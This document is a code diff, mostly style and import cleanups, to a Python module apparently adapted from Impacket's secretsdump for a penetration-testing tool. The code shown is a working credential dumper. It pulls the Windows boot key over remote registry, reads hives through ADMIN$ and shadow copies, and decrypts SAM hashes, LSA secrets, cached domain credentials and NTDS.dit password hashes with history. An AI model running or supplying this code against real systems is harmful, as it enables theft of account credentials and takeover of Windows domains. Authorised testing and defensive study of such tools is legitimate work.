@@ -2,8 +2,44 @@
 # -*- coding: iso-8859-15 -*-
 # -*- Mode: python -*-
 
-from lib.common import *
-from lib.structures import *
+import time
+import random
+import hashlib
+import sys
+import string
+from struct import pack
+from lib.common import DataStore, RemoteFile, registryKey
+from lib.structures import (DOMAIN_ACCOUNT_F, USER_ACCOUNT_V, LSA_SECRET_XP,
+                            LSA_SECRET, LSA_SECRET_BLOB, NL_RECORD, SAMR_RPC_SID)
+from lib.logger import logger
+
+try:
+    from impacket import nt_errors
+    from impacket import ntlm
+    from impacket import winregistry
+    from impacket.dcerpc.v5 import rrp
+    from impacket.dcerpc.v5 import transport
+    from impacket.ese import ESENT_DB
+    from impacket.winregistry import hexdump
+    from impacket.smbconnection import ntpath, SessionError
+    from impacket.structure import Structure
+
+except ImportError:
+    sys.stderr.write('You need to install Python Impacket library first.\nGet it from Core Security\'s Google Code'
+                     + 'repository:\nsudo apt-get -y remove python-impacket # to remove the system-installed outdated'
+                     + 'version of the library\ncd /tmp'
+                     + '\nsvn checkout http://impacket.googlecode.com/svn/trunk/ impacket\ncd impacket'
+                     + '\npython setup.py build\nsudo python setup.py install\n')
+    sys.exit(255)
+
+try:
+    from Crypto.Cipher import DES, ARC4, AES
+    from Crypto.Hash import HMAC, MD4, MD5
+except ImportError:
+    sys.stderr.write('You do not have any crypto installed. You need PyCrypto.'
+                     + '\nRun: apt-get install python-crypto or get it from http://www.pycrypto.org')
+    sys.exit(255)
+
 
 ####################################################################
 # Code borrowed and adapted from Impacket's secretsdump.py example #
@@ -36,7 +72,7 @@ class RemoteOperations:
         elif status == 'RUNNING':
             logger.debug('Service %s is already running' % self.__service_name)
             self.__should_stop = False
-            self.__started  = True
+            self.__started = True
         else:
             raise Exception('Unknown service status: %s' % status)
 
@@ -61,12 +97,12 @@ class RemoteOperations:
         ans = rrp.hOpenLocalMachine(self.__rrp)
         self.__regHandle = ans['phKey']
 
-        for key in ['JD','Skew1','GBG','Data']:
-            logger.debug('Retrieving class info for %s'% key)
+        for key in ['JD', 'Skew1', 'GBG', 'Data']:
+            logger.debug('Retrieving class info for %s' % key)
             ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Control\\Lsa\\%s' % key)
             keyHandle = ans['phkResult']
             ans = rrp.hBaseRegQueryInfoKey(self.__rrp, keyHandle)
-            bootKey =  bootKey + ans['lpClassOut'][:-1]
+            bootKey = bootKey + ans['lpClassOut'][:-1]
             rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
 
         transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
@@ -115,7 +151,7 @@ class RemoteOperations:
         rrp.hBaseRegCloseKey(self.__rrp, regHandle)
 
         # Open the temporary remote file, so it can be read later
-        #remote_fp = RemoteFile(self.smb, ntpath.join('\\', temp_filename), share=DataStore.writable_share)
+        # remote_fp = RemoteFile(self.smb, ntpath.join('\\', temp_filename), share=DataStore.writable_share)
         remote_fp = RemoteFile(self.smb, ntpath.join('System32', temp_filename), share='ADMIN$')
 
         return remote_fp
@@ -133,8 +169,8 @@ class RemoteOperations:
 
         # Let's find the last one
         for line in DataStore.cmd_stdout.split('\n'):
-           if line.find('GLOBALROOT') > 0:
-               last_shadow = line[line.find('\\\\?'):][:-1]
+            if line.find('GLOBALROOT') > 0:
+                last_shadow = line[line.find('\\\\?'):][:-1]
 
         return last_shadow
 
@@ -186,7 +222,8 @@ class RemoteOperations:
 
     def get_default_login_account(self):
         try:
-            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
+            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle,
+                                      'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon')
             keyHandle = ans['phkResult']
             dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DefaultUserName')
             username = dataValue[:-1]
@@ -227,19 +264,20 @@ class RemoteOperations:
         self.__restore()
         self.__rrp.disconnect()
 
+
 class CryptoCommon:
     # Common crypto stuff used over different classes
     def transformKey(self, InputKey):
         # Section 2.2.11.1.2 Encrypting a 64-Bit Block with a 7-Byte Key
         OutputKey = []
-        OutputKey.append( chr(ord(InputKey[0]) >> 0x01) )
-        OutputKey.append( chr(((ord(InputKey[0])&0x01)<<6) | (ord(InputKey[1])>>2)) )
-        OutputKey.append( chr(((ord(InputKey[1])&0x03)<<5) | (ord(InputKey[2])>>3)) )
-        OutputKey.append( chr(((ord(InputKey[2])&0x07)<<4) | (ord(InputKey[3])>>4)) )
-        OutputKey.append( chr(((ord(InputKey[3])&0x0F)<<3) | (ord(InputKey[4])>>5)) )
-        OutputKey.append( chr(((ord(InputKey[4])&0x1F)<<2) | (ord(InputKey[5])>>6)) )
-        OutputKey.append( chr(((ord(InputKey[5])&0x3F)<<1) | (ord(InputKey[6])>>7)) )
-        OutputKey.append( chr(ord(InputKey[6]) & 0x7F) )
+        OutputKey.append(chr(ord(InputKey[0]) >> 0x01))
+        OutputKey.append(chr(((ord(InputKey[0]) & 0x01) << 6) | (ord(InputKey[1]) >> 2)))
+        OutputKey.append(chr(((ord(InputKey[1]) & 0x03) << 5) | (ord(InputKey[2]) >> 3)))
+        OutputKey.append(chr(((ord(InputKey[2]) & 0x07) << 4) | (ord(InputKey[3]) >> 4)))
+        OutputKey.append(chr(((ord(InputKey[3]) & 0x0F) << 3) | (ord(InputKey[4]) >> 5)))
+        OutputKey.append(chr(((ord(InputKey[4]) & 0x1F) << 2) | (ord(InputKey[5]) >> 6)))
+        OutputKey.append(chr(((ord(InputKey[5]) & 0x3F) << 1) | (ord(InputKey[6]) >> 7)))
+        OutputKey.append(chr(ord(InputKey[6]) & 0x7F))
 
         for i in range(8):
             OutputKey[i] = chr((ord(OutputKey[i]) << 1) & 0xfe)
@@ -253,10 +291,11 @@ class CryptoCommon:
         # Note that because I is in little-endian byte order, I[0] is the least significant byte.
         # Key1 is a concatenation of the following values: I[0], I[1], I[2], I[3], I[0], I[1], I[2].
         # Key2 is a concatenation of the following values: I[3], I[0], I[1], I[2], I[3], I[0], I[1]
-        key = pack('<L',baseKey)
+        key = pack('<L', baseKey)
         key1 = key[0] + key[1] + key[2] + key[3] + key[0] + key[1] + key[2]
         key2 = key[3] + key[0] + key[1] + key[2] + key[3] + key[0] + key[1]
-        return self.transformKey(key1),self.transformKey(key2)
+        return self.transformKey(key1), self.transformKey(key2)
+
 
 class OfflineRegistry:
     def __init__(self, hiveFile=None):
@@ -305,6 +344,7 @@ class OfflineRegistry:
         # Remove temp file and whatever else is needed
         self.__registry_hive.close()
 
+
 class SAMHashes(OfflineRegistry):
     def __init__(self, samFile, bootKey):
         OfflineRegistry.__init__(self, samFile)
@@ -319,14 +359,14 @@ class SAMHashes(OfflineRegistry):
         QWERTY = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
         DIGITS = "0123456789012345678901234567890123456789\0"
 
-        F = self.getValue(ntpath.join('SAM\Domains\Account','F'))[1]
+        F = self.getValue(ntpath.join('SAM\Domains\Account', 'F'))[1]
 
         domainData = DOMAIN_ACCOUNT_F(F)
 
         rc4Key = MD5(domainData['Key0']['Salt'] + QWERTY + self.__bootKey + DIGITS)
 
         rc4 = ARC4.new(rc4Key)
-        self.__hashedBootKey = rc4.encrypt(domainData['Key0']['Key']+domainData['Key0']['CheckSum'])
+        self.__hashedBootKey = rc4.encrypt(domainData['Key0']['Key'] + domainData['Key0']['CheckSum'])
 
         # Verify key with checksum
         checkSum = MD5(self.__hashedBootKey[:16] + DIGITS + self.__hashedBootKey[:16] + QWERTY)
@@ -340,7 +380,7 @@ class SAMHashes(OfflineRegistry):
         Key1, Key2 = self.__cryptoCommon.deriveKey(rid)
         Crypt1 = DES.new(Key1, DES.MODE_ECB)
         Crypt2 = DES.new(Key2, DES.MODE_ECB)
-        rc4Key = MD5( self.__hashedBootKey[:0x10] + pack("<L",rid) + constant )
+        rc4Key = MD5(self.__hashedBootKey[:0x10] + pack("<L", rid) + constant)
         rc4 = ARC4.new(rc4Key)
         key = rc4.encrypt(cryptedHash)
         decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])
@@ -370,19 +410,20 @@ class SAMHashes(OfflineRegistry):
             pass
 
         for rid in rids:
-            userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey,rid,'V'))[1])
+            userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey, rid, 'V'))[1])
             rid = int(rid, 16)
             baseOffset = len(USER_ACCOUNT_V())
             V = userAccount['Data']
-            userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')
+            userName = V[userAccount['NameOffset']:userAccount['NameOffset'] + userAccount['NameLength']].decode(
+                'utf-16le')
 
             if userAccount['LMHashLength'] == 20:
-                encLMHash = V[userAccount['LMHashOffset']+4:userAccount['LMHashOffset']+userAccount['LMHashLength']]
+                encLMHash = V[userAccount['LMHashOffset'] + 4:userAccount['LMHashOffset'] + userAccount['LMHashLength']]
             else:
                 encLMHash = ''
 
             if userAccount['NTHashLength'] == 20:
-                encNTHash = V[userAccount['NTHashOffset']+4:userAccount['NTHashOffset']+userAccount['NTHashLength']]
+                encNTHash = V[userAccount['NTHashOffset'] + 4:userAccount['NTHashOffset'] + userAccount['NTHashLength']]
             else:
                 encNTHash = ''
 
@@ -395,7 +436,7 @@ class SAMHashes(OfflineRegistry):
             if ntHash == '':
                 ntHash = ntlm.NTOWFv1('', '')
 
-            answer =  "%s:%d:%s:%s:::" % (userName, rid, lmHash.encode('hex'), ntHash.encode('hex'))
+            answer = "%s:%d:%s:%s:::" % (userName, rid, lmHash.encode('hex'), ntHash.encode('hex'))
             self.__itemsFound[rid] = answer
 
             print answer
@@ -409,6 +450,7 @@ class SAMHashes(OfflineRegistry):
                 fd.write('%s\n' % self.__itemsFound[item])
 
             fd.close()
+
 
 class LSASecrets(OfflineRegistry):
     def __init__(self, securityFile, bootKey):
@@ -433,21 +475,21 @@ class LSASecrets(OfflineRegistry):
 
         return sha.digest()
 
-    def __decryptAES(self, key, value, iv='\x00'*16):
+    def __decryptAES(self, key, value, iv='\x00' * 16):
         plainText = ''
 
-        if iv != '\x00'*16:
-            aes256 = AES.new(key,AES.MODE_CBC, iv)
+        if iv != '\x00' * 16:
+            aes256 = AES.new(key, AES.MODE_CBC, iv)
 
         for index in range(0, len(value), 16):
-            if iv == '\x00'*16:
-                aes256 = AES.new(key,AES.MODE_CBC, iv)
+            if iv == '\x00' * 16:
+                aes256 = AES.new(key, AES.MODE_CBC, iv)
 
-            cipherBuffer = value[index:index+16]
+            cipherBuffer = value[index:index + 16]
 
             # Pad buffer to 16 bytes
             if len(cipherBuffer) < 16:
-                cipherBuffer += '\x00' * (16-len(cipherBuffer))
+                cipherBuffer += '\x00' * (16 - len(cipherBuffer))
 
             plainText += aes256.decrypt(cipherBuffer)
 
@@ -477,7 +519,7 @@ class LSASecrets(OfflineRegistry):
         return (secret['Secret'])
 
     def __decryptHash(self, key, value, iv):
-        hmac_md5 = HMAC.new(key,iv)
+        hmac_md5 = HMAC.new(key, iv)
         rc4key = hmac_md5.digest()
         rc4 = ARC4.new(rc4key)
         data = rc4.encrypt(value)
@@ -533,7 +575,7 @@ class LSASecrets(OfflineRegistry):
             tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
             self.__NKLMKey = self.__decryptAES(tmpKey, record['EncryptedData'][32:])
         else:
-            self.__NKLMKey = self.__decryptSecret(self.__LSAKey,value[1][0xc:])
+            self.__NKLMKey = self.__decryptSecret(self.__LSAKey, value[1][0xc:])
 
     def __pad(self, data):
         if (data & 0x3) > 0:
@@ -566,7 +608,7 @@ class LSASecrets(OfflineRegistry):
 
         for value in values:
             logger.debug('Looking into %s' % value)
-            record = NL_RECORD(self.getValue(ntpath.join('\\Cache',value))[1])
+            record = NL_RECORD(self.getValue(ntpath.join('\\Cache', value))[1])
 
             if record['CH'] != 16 * '\x00':
                 if self.__vistaStyle is True:
@@ -621,7 +663,7 @@ class LSASecrets(OfflineRegistry):
                 if account is None:
                     secret = '(Unknown User) '
                 else:
-                    secret =  "%s " % account
+                    secret = "%s " % account
 
                 secret += strDecoded
 
@@ -655,7 +697,9 @@ class LSASecrets(OfflineRegistry):
             # Compute MD4 of the secret.. yes.. that is the nthash
             md4 = MD4.new()
             md4.update(secretItem)
-            secret = "%s\\%s$:%s:%s:::" % (DataStore.server_domain, DataStore.server_name, ntlm.LMOWFv1('', '').encode('hex'), md4.digest().encode('hex'))
+            secret = "%s\\%s$:%s:%s:::" % (
+                DataStore.server_domain, DataStore.server_name, ntlm.LMOWFv1('', '').encode('hex'),
+                md4.digest().encode('hex'))
 
         if secret != '':
             print secret
@@ -696,7 +740,7 @@ class LSASecrets(OfflineRegistry):
                     record = LSA_SECRET_BLOB(plainText)
                     secret = record['Secret']
                 else:
-                    secret = self.__decryptSecret(self.__LSAKey,value[1][0xc:])
+                    secret = self.__decryptSecret(self.__LSAKey, value[1][0xc:])
 
                 self.__printSecret(key, secret)
 
@@ -718,55 +762,56 @@ class LSASecrets(OfflineRegistry):
 
             fd.close()
 
+
 class NTDSHashes(object):
     NAME_TO_INTERNAL = {
-        'uSNCreated':'ATTq131091',
-        'uSNChanged':'ATTq131192',
-        'name':'ATTm3',
-        'objectGUID':'ATTk589826',
-        'objectSid':'ATTr589970',
-        'userAccountControl':'ATTj589832',
-        'primaryGroupID':'ATTj589922',
-        'accountExpires':'ATTq589983',
-        'logonCount':'ATTj589993',
-        'sAMAccountName':'ATTm590045',
-        'sAMAccountType':'ATTj590126',
-        'lastLogonTimestamp':'ATTq589876',
-        'userPrincipalName':'ATTm590480',
-        'unicodePwd':'ATTk589914',
-        'dBCSPwd':'ATTk589879',
-        'ntPwdHistory':'ATTk589918',
-        'lmPwdHistory':'ATTk589984',
-        'pekList':'ATTk590689',
+        'uSNCreated': 'ATTq131091',
+        'uSNChanged': 'ATTq131192',
+        'name': 'ATTm3',
+        'objectGUID': 'ATTk589826',
+        'objectSid': 'ATTr589970',
+        'userAccountControl': 'ATTj589832',
+        'primaryGroupID': 'ATTj589922',
+        'accountExpires': 'ATTq589983',
+        'logonCount': 'ATTj589993',
+        'sAMAccountName': 'ATTm590045',
+        'sAMAccountType': 'ATTj590126',
+        'lastLogonTimestamp': 'ATTq589876',
+        'userPrincipalName': 'ATTm590480',
+        'unicodePwd': 'ATTk589914',
+        'dBCSPwd': 'ATTk589879',
+        'ntPwdHistory': 'ATTk589918',
+        'lmPwdHistory': 'ATTk589984',
+        'pekList': 'ATTk590689',
     }
 
-    INTERNAL_TO_NAME = dict((v,k) for k,v in NAME_TO_INTERNAL.iteritems())
+    INTERNAL_TO_NAME = dict((v, k) for k, v in NAME_TO_INTERNAL.iteritems())
 
     SAM_NORMAL_USER_ACCOUNT = 0x30000000
-    SAM_MACHINE_ACCOUNT     = 0x30000001
-    SAM_TRUST_ACCOUNT       = 0x30000002
+    SAM_MACHINE_ACCOUNT = 0x30000001
+    SAM_TRUST_ACCOUNT = 0x30000002
 
     ACCOUNT_TYPES = (SAM_NORMAL_USER_ACCOUNT, SAM_MACHINE_ACCOUNT, SAM_TRUST_ACCOUNT)
 
     class PEK_KEY(Structure):
         structure = (
-            ('Header','8s=""'),
-            ('KeyMaterial','16s=""'),
-            ('EncryptedPek','52s=""'),
+            ('Header', '8s=""'),
+            ('KeyMaterial', '16s=""'),
+            ('EncryptedPek', '52s=""'),
         )
 
     class CRYPTED_HASH(Structure):
         structure = (
-            ('Header','8s=""'),
-            ('KeyMaterial','16s=""'),
-            ('EncryptedHash','16s=""'),
+            ('Header', '8s=""'),
+            ('KeyMaterial', '16s=""'),
+            ('EncryptedHash', '16s=""'),
         )
 
     class CRYPTED_HISTORY(Structure):
         structure = (
-            ('Header','8s=""'),
-            ('KeyMaterial','16s=""'),
-            ('EncryptedHash',':'),
+            ('Header', '8s=""'),
+            ('KeyMaterial', '16s=""'),
+            ('EncryptedHash', ':'),
         )
 
     def __init__(self, ntds_file, bootKey, history=False, noLMHash=True):
@@ -795,7 +840,7 @@ class NTDSHashes(object):
             if record is None:
                 break
             elif record[self.NAME_TO_INTERNAL['pekList']] is not None:
-                pek =  record[self.NAME_TO_INTERNAL['pekList']].decode('hex')
+                pek = record[self.NAME_TO_INTERNAL['pekList']].decode('hex')
                 break
             elif record[self.NAME_TO_INTERNAL['sAMAccountType']] in self.ACCOUNT_TYPES:
                 # Okey.. we found some users, but we're not yet ready to process them.
@@ -844,7 +889,7 @@ class NTDSHashes(object):
             tmpLMHash = self.__removeRC4Layer(encryptedLMHash)
             LMHash = self.__removeDESLayer(tmpLMHash, rid)
         else:
-            LMHash = ntlm.LMOWFv1('','')
+            LMHash = ntlm.LMOWFv1('', '')
             encryptedLMHash = None
 
         if record[self.NAME_TO_INTERNAL['unicodePwd']] is not None:
@@ -852,7 +897,7 @@ class NTDSHashes(object):
             tmpNTHash = self.__removeRC4Layer(encryptedNTHash)
             NTHash = self.__removeDESLayer(tmpNTHash, rid)
         else:
-            NTHash = ntlm.NTOWFv1('','')
+            NTHash = ntlm.NTOWFv1('', '')
             encryptedNTHash = None
 
         if record[self.NAME_TO_INTERNAL['userPrincipalName']] is not None:
@@ -874,8 +919,8 @@ class NTDSHashes(object):
                 encryptedLMHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['lmPwdHistory']].decode('hex'))
                 tmpLMHistory = self.__removeRC4Layer(encryptedLMHistory)
 
-                for i in range(0, len(tmpLMHistory)/16):
-                    LMHash = self.__removeDESLayer(tmpLMHistory[i*16:(i+1)*16], rid)
+                for i in range(0, len(tmpLMHistory) / 16):
+                    LMHash = self.__removeDESLayer(tmpLMHistory[i * 16:(i + 1) * 16], rid)
                     LMHistory.append(LMHash)
 
             if record[self.NAME_TO_INTERNAL['ntPwdHistory']] is not None:
@@ -883,18 +928,19 @@ class NTDSHashes(object):
                 encryptedNTHistory = self.CRYPTED_HISTORY(record[self.NAME_TO_INTERNAL['ntPwdHistory']].decode('hex'))
                 tmpNTHistory = self.__removeRC4Layer(encryptedNTHistory)
 
-                for i in range(0, len(tmpNTHistory)/16):
-                    NTHash = self.__removeDESLayer(tmpNTHistory[i*16:(i+1)*16], rid)
+                for i in range(0, len(tmpNTHistory) / 16):
+                    NTHash = self.__removeDESLayer(tmpNTHistory[i * 16:(i + 1) * 16], rid)
                     NTHistory.append(NTHash)
 
-            for i, (LMHash, NTHash) in enumerate(map(lambda l,n: (l,n) if l else ('',n), LMHistory[1:], NTHistory[1:])):
+            for i, (LMHash, NTHash) in enumerate(
+                    map(lambda l, n: (l, n) if l else ('', n), LMHistory[1:], NTHistory[1:])):
                 if self.__no_LMhash:
                     lmhash = ntlm.LMOWFv1('', '').encode('hex')
                 else:
                     lmhash = LMHash.encode('hex')
 
                 answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, NTHash.encode('hex'))
-                self.__itemsFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex')+str(i)] = answer
+                self.__itemsFound[record[self.NAME_TO_INTERNAL['objectSid']].decode('hex') + str(i)] = answer
                 print answer
 
     def dumpNTDS(self):
@@ -957,6 +1003,7 @@ class NTDSHashes(object):
     def finishNTDS(self):
         if hasattr(self, '__ESEDB'):
             self.__ESEDB.close()
+
 
 class SecretsDump(RemoteOperations, SAMHashes, LSASecrets, NTDSHashes):
     def __init__(self):
